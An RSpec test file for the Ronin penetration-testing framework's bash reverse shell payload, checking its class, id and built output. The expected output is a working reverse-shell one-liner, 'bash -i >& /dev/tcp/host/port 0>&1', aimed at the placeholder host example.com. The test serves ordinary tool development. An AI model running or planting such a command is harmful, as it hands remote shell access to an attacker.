require 'spec_helper'
require 'ronin/payloads/builtin/command/bash/reverse_shell'

describe Ronin::Payloads::Command::Bash::ReverseShell do
  it "must inherit from Ronin::Payloads::CommandPayload" do
    expect(described_class).to be < Ronin::Payloads::CommandPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'command/bash/reverse_shell'" do
      expect(subject.id).to eq('command/bash/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.build }

    it "must build an `bash` command that connects back to the host and port params" do
      expect(subject.payload).to eq("bash -i >& /dev/tcp/#{host}/#{port} 0>&1")
    end
  end
end
